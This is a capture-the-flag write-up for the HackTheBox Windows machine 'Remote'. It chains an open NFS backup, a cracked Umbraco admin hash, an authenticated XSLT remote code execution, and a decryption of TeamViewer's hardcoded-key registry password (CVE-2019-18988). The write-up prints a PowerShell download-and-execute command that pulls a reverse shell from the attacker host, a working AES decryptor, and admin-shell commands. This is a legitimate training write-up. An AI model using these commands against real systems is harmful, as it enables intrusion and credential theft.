---
title: "HTB - Remote"
date: 2026-03-06
description: "Easy Windows machine. NFS exposes a world-readable site backup containing Umbraco CMS credentials. An authenticated XSLT RCE exploit lands a shell as IIS AppPool. TeamViewer 7 stores its password encrypted with a hardcoded AES key in the registry — a Python one-liner decrypts it and the password is reused on the Administrator account."
tags: ["hackthebox", "windows", "easy", "nfs", "umbraco", "cms", "rce", "teamviewer", "cve-2019-18988", "hashcat", "evil-winrm", "nishang", "aes", "registry"]
tools: ["Nmap", "hashcat", "Nishang", "evil-winrm", "Impacket"]
---

## Overview

{{< callout type="info" >}}
**Attack Path:** NFS `/site_backups` → `Umbraco.sdf` SHA1 hash → hashcat → Umbraco 7.12.4 XSLT RCE → IIS AppPool shell → TeamViewer registry → AES decrypt → `!R3m0te!` → administrator
{{< /callout >}}

Remote is an Easy Windows machine where everything important is hiding in plain sight. The HTTP site advertises Umbraco CMS, FTP is open but empty, SMB denies access, and then NFS shows up — uncommon on Windows — exposing a full site backup to unauthenticated anyone. The backup contains the Umbraco database file, which strings reveals an admin SHA1 hash. Hashcat cracks it in seconds. Authenticated RCE via a public XSLT exploit delivers a Nishang reverse shell as the IIS app pool identity. On the box, TeamViewer 7 is running as a service. Its password is stored in the registry encrypted with AES-128-CBC using a hardcoded static key — a short Python script decrypts it to `!R3m0te!`, which is reused on the local Administrator account.

{{< htb-box-info name="Remote" avatar="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/8d7c152dc9c28c9556b07dc724c6a37b.png" os="Windows" difficulty="Easy" release="21 Mar 2020" retire="01 Sep 2020" user_blood="enjiloezz" user_blood_url="https://app.hackthebox.com/users/23792" user_blood_img="https://account.hackthebox.com/storage/users/b5d1899f-6e3f-4406-9d41-5fe7df387e89-avatar.png" user_blood_time="00:57:49" root_blood="qtc" root_blood_url="https://app.hackthebox.com/users/103578" root_blood_img="https://account.hackthebox.com/storage/users/cce7f972-010d-469a-b319-d0d4da1767d9-avatar.png" root_blood_time="01:04:46" creator="mrb3n8132" creator_url="https://app.hackthebox.com/users/2984" creator_img="https://account.hackthebox.com/storage/users/a07ab1f7-c03c-4fc5-8381-68bfd3f453c2-avatar.png" >}}

---

## Enumeration

### Nmap

Full TCP port sweep first:

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.129.230.172
```

```
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
5985/tcp  open  wsman
47001/tcp open  winrm
49664-49680/tcp open  unknown
```

Service scan on the interesting ports:

```bash
nmap -sV -sC -p 21,80,111,135,139,445,2049,5985,47001 -oA scans/nmap-tcpscripts 10.129.230.172
```

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
445/tcp   open  microsoft-ds?
```

A lot to work through: FTP with anonymous access, HTTP, SMB, and NFS on 2049. WinRM on 5985 is noted for later. NFS on a Windows machine is unusual and worth prioritising.

### FTP

Anonymous login works but the root directory is empty and write access is denied. Nothing here.

### SMB

Standard checks come back denied:

```bash
smbclient -N -L //10.129.230.172
```

```
session setup failed: NT_STATUS_ACCESS_DENIED
```

```bash
smbmap -H 10.129.230.172
```

```
[!] Authentication error on 10.129.230.172
```

### Web

Port 80 serves an Acme Widgets site. Poking around the pages turns up multiple references to Umbraco: CSS links, JavaScript links, and text references near the blog posts. Googling the CMS confirms the admin panel lives at `/umbraco`. It loads a login form. Default credential attempts fail.

{{< callout type="info" >}}
Umbraco 7.12.4 has a public authenticated RCE exploit via XSLT injection. Credentials are needed before that is useful — the NFS share will provide them.
{{< /callout >}}

### NFS

NFS on Windows is rare. `showmount` shows a share exported to everyone:

```bash
showmount -e 10.129.230.172
```

```
Export list for 10.129.230.172:
/site_backups (everyone)
```

Mount it:

```bash
mount -t nfs 10.129.230.172:/site_backups /mnt/
```

The mount is a full web directory backup including `App_Data`, `Config`, `Views`, and `Web.config`. Inside `App_Data` is `Umbraco.sdf` — a SQL Server Compact database file. Running `strings` on it pulls readable data from the top:

```bash
strings /mnt/App_Data/Umbraco.sdf | head
```

```
Administratoradmindefaulten-US
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.local
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}
```

Two accounts visible. The `admin@htb.local` account uses SHA1 — straightforward to crack. The `smith` account uses HMACSHA256 with a salt, harder to attack. The admin hash is the target.

---

## Foothold

### Cracking the Hash

```bash
hashcat -m 100 b8be16afba8c314ad33d812f22a04991b90e2aaa /usr/share/wordlists/rockyou.txt
```

```
b8be16afba8c314ad33d812f22a04991b90e2aaa:baconandcheese

Status: Cracked
Hash.Type: SHA1
Time: 4 secs
```

Credentials recovered: `admin@htb.local:baconandcheese`

---

### Umbraco RCE

Login to `/umbraco` with `admin@htb.local:baconandcheese` works. The Help section confirms the version: **7.12.4**.

A public Python exploit for Umbraco authenticated RCE abuses an XSLT transform that executes C# code server-side. The exploit needs three values set: login, password, and host. The payload section controls what gets executed — it spawns a process by filename plus arguments:

```python
login    = "admin@htb.local"
password = "baconandcheese"
host     = "http://10.129.230.172"
```

The default payload launches `calc.exe`. The target process needs to change to `cmd.exe` so arbitrary commands can be passed via the `Arguments` field. A quick ping confirms execution before going for a shell:

```python
string cmd = "/c ping 10.10.14.26";
```

```bash
tcpdump -i tun0 icmp
```

```
16:53:30 IP 10.129.230.172 > 10.10.14.26: ICMP echo request
16:53:30 IP 10.10.14.26 > 10.129.230.172: ICMP echo reply
```

RCE confirmed. The shell payload downloads and executes a Nishang reverse shell via PowerShell IEX:

```python
string cmd = "/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.26/shell.ps1')";
```

`shell.ps1` is Invoke-PowerShellTcp.ps1 from Nishang with the invocation appended at the bottom:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.26 -Port 443
```

Three terminals: run the exploit, serve `shell.ps1` over HTTP, catch the shell on 443.

The web server logs the retrieval:

```
10.129.230.172 - - "GET /shell.ps1 HTTP/1.1" 200 -
```

Shell lands:

```bash
rlwrap nc -lvnp 443
```

```
Windows PowerShell running as user REMOTE$ on REMOTE

PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

### User Flag

No user home directories contain the flag. It is in the Public folder:

```
PS C:\users\Public> type user.txt
96d3****************************
```

---

## Privilege Escalation

### Enumeration

`tasklist` from the IIS shell shows a non-standard process:

```
TeamViewer_Service.exe   3108   18,392 K
```

TeamViewer is remote management software. As the server-side service, it holds credentials used by clients to connect. The version can be confirmed by checking the install directory:

```
PS C:\Program Files (x86)\TeamViewer> ls

Mode    LastWriteTime    Name
----    -------------    ----
d-----  2/27/2020        Version7
```

Version 7 is installed. Versions 7.0.43148 through 14.7.1965 store connection passwords in the Windows registry encrypted with AES-128-CBC using a **hardcoded key and IV** — the same values in every installation. This is CVE-2019-18988.

### Registry Credential Recovery

The registry path for Version 7:

```powershell
cd HKLM:\software\wow6432node\teamviewer\version7
Get-ItemProperty -Path .
```

```
SecurityPasswordAES : {255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174,
                       19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218,
                       126, 141, 55, 107, 38, 57, 78, 91}
```

`SecurityPasswordAES` is present — a list of integers representing the ciphertext bytes.

### Decrypting the Password

The Metasploit module source reveals the hardcoded key and IV. Recreating the decryption in Python:

```python
from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv  = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"

ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174,
                    19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218,
                    126, 141, 55, 107, 38, 57, 78, 91])

aes      = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")

print(f"[+] Found password: {password}")
```

```
[+] Found password: !R3m0te!
```

### Shell as Administrator

Verify the password against SMB:

```bash
crackmapexec smb 10.129.230.172 -u administrator -p '!R3m0te!'
```

```
SMB  10.129.230.172  445  REMOTE  [+] REMOTE\administrator:!R3m0te! (Pwn3d!)
```

`(Pwn3d!)` confirms local admin. Multiple paths to a shell from here.

**Evil-WinRM:**

```bash
evil-winrm -u administrator -p '!R3m0te!' -i 10.129.230.172
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> whoami
remote\administrator
```

**psexec.py (SYSTEM):**

```bash
psexec.py 'administrator:!R3m0te!@10.129.230.172'
```

```
C:\Windows\system32> whoami
nt authority\system
```

**wmiexec.py:**

```bash
wmiexec.py 'administrator:!R3m0te!@10.129.230.172'
```

```
C:\> whoami
remote\administrator
```

### Root Flag

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
e2ae****************************
```

---

## Summary

| Step | Technique |
|------|-----------|
| Discovery | NFS `/site_backups` exported to everyone |
| Credential recovery | `strings` on `Umbraco.sdf` — SHA1 hash for `admin@htb.local` |
| Cracking | hashcat mode 100 (SHA1) — `baconandcheese` |
| Foothold | Umbraco 7.12.4 authenticated XSLT RCE — IIS AppPool shell |
| Enumeration | `tasklist` reveals TeamViewer 7 service |
| Credential recovery | `SecurityPasswordAES` from registry — AES-128-CBC with hardcoded key |
| Decryption | Python script decrypts to `!R3m0te!` |
| Administrator | Evil-WinRM / psexec.py / wmiexec.py with recovered credentials |

## Key Takeaways

NFS on a Windows machine is immediately worth investigating. It is uncommon enough that its presence is a signal, and world-readable exports are a consistent finding — administrators enable it for backup or deployment workflows and leave the access control wide open. The site backup here is a complete web root including the database, which contains credentials in a format that falls to rockyou in seconds.

The TeamViewer vulnerability is a good example of a class of credential exposure that affects installed software rather than the OS. The AES key and IV are hardcoded in every Version 7 installation, meaning any low-privilege process can read the encrypted registry value and decrypt it without any elevated access. The lesson is not specific to TeamViewer: any installed application that stores credentials encrypted with a symmetric key baked into the binary is vulnerable to the same approach. During post-exploitation on Windows, checking for remote access software (TeamViewer, VNC, AnyDesk) and recovering their stored credentials is a reliable step — they are frequently reused on local or domain accounts.
